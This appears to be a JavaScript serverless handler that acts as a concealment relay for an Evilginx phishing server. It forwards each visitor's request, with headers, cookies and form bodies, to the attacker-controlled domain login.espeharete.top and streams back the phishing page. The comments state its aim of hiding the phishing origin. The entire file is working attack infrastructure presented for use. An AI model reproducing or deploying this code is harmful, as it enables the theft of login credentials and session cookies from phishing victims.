export default async function handler(req, res) {
  // Define your Evilginx Domain 1 URL (hidden origin)
  const targetUrl = `https://login.espeharete.top${req.url}`;

  // Forward all headers (except 'host' to avoid conflicts)
  const headers = { ...req.headers };
  delete headers['host'];

  try {
    // Fetch the Evilginx page and stream it back
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: headers,
      body: req.method !== 'GET' ? req.body : undefined,
    });

    // Forward the response
    const data = await response.text();
    res.status(response.status).send(data);
  } catch (error) {
    res.status(500).send("Proxy error: " + error.message);
  }
}
